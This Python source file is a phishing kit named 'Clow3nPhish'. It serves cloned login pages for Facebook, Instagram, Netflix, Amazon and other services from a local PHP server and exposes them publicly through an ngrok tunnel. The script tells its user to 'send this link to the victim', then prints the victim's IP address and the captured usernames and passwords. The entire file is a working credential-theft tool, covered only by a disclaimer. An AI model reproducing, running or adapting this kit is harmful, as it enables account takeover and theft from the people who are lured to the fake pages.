#!/usr/bin/python

import time
import subprocess
import os.path
from subprocess import Popen, PIPE
import json
import urllib
import os
from colorama import Fore, Style
import _multiprocessing
import sys


subprocess.call(["clear"])
os.system("pkill ngrok &")
os.system("pkill php &")
os.system("apt install wget curl php ")
subprocess.call(["clear"])

print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX + """

 _____ _               _____      ______ _     _     _     
/  __ \ |             |____ |     | ___ \ |   (_)   | |    
| /  \/ | _____      __   / /_ __ | |_/ / |__  _ ___| |__  
| |   | |/ _ \ \ /\ / /   \ \ '_ \|  __/| '_ \| / __| '_ \ 
| \__/\ | (_) \ V  V /.___/ / | | | |   | | | | \__ \ | | |
 \____/_|\___/ \_/\_/ \____/|_| |_\_|   |_| |_|_|___/_| |_|

                     CREATED BY:-Xclow3n
  Disclaimer: We are not responsible for any misuse of this tool
		     Telegram group: @offlicalClow3nSec""")
if os.path.exists("ngrok"):
    print("\n[*]ngrok founded")
else:
    os.system("chmod +x ngrok_download.sh")
    os.system("bash ngrok_download.sh")


print("""
     [1]Facebook
     [2]Instagram
     [3]Snapchat   
     [4]Spotify
     [5]Netflix
     [6]Steam
     [7]Linkedin
     [8]Wordpress
     [9]Pinterest
     [10]Amazon
     [99]Exit
""")
server = ""
select = int(input("Choose any option: "))
if (select == 1):
    server = "facebook"
elif(select == 2):
    server = "instagram"
elif(select == 3):
    server = "snapchat"
elif(select == 4):
    server = "spotify"
elif(select == 5):
    server = "netflix"
elif(select == 6):
    server = "steam"
elif(select == 7):
    server = "linkedin"
elif(select == 8):
    server = "wordpress"
elif(select == 9):
    server = "pinterest"
elif(select == 10):
    server = "amazon"
elif(select == 99):
    exit(1)


if os.path.exists("sites/%s/usernames.txt" % server):
    os.system("rm sites/%s/usernames.txt &" % server)
if os.path.exists("sites/%s/ip.txt" % server):
    os.system("rm sites/%s/ip.txt &" % server)

print("[*]Starting php Server")
os_command = ("cd sites/%s && php -S 127.0.0.1:3333 > /dev/null 2>&1 & " % server)
os.system(os_command)
time.sleep(2)
print("[*]Starting Ngrok Server")
os.system("./ngrok http 3333 > /dev/null 2>&1 &")
time.sleep(20)
link = ("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[0-9a-z]*\.ngrok.io\"")
getting = os.popen(link).read()
print("Send this link to the victim: %s" % getting)
p = ''
b = False
def ngrok():
    global b, pread
    p = os.system("./ngrok http 3333")
    b = True
def main():
    global b, p
    while True:
        if b:
            print('[*]Ngrok is running')
        else:
            print('[*]Now Ngrok is not running in background\n')
            x = raw_input("[*]Enter \"Y\" to start ngrok: ")

            if (x == "Y" or x == "y"):
                ngrok()
            elif (x == 'stop'):
                  p.terminate()
                  b = False
            main()
time.sleep(2)
i = 0
while(i != 1):
    if os.path.exists("sites/%s/ip.txt" % server):
        os.system("cat sites/%s/ip.txt" % server)
        os.system("rm sites/%s/ip.txt" % server)
        i = i+1
print("\nWaiting for credentials\n")        
while True:
    if os.path.exists("sites/%s/usernames.txt" % server):
        username =("cat sites/%s/usernames.txt" % server)
        os.system(username)
        break
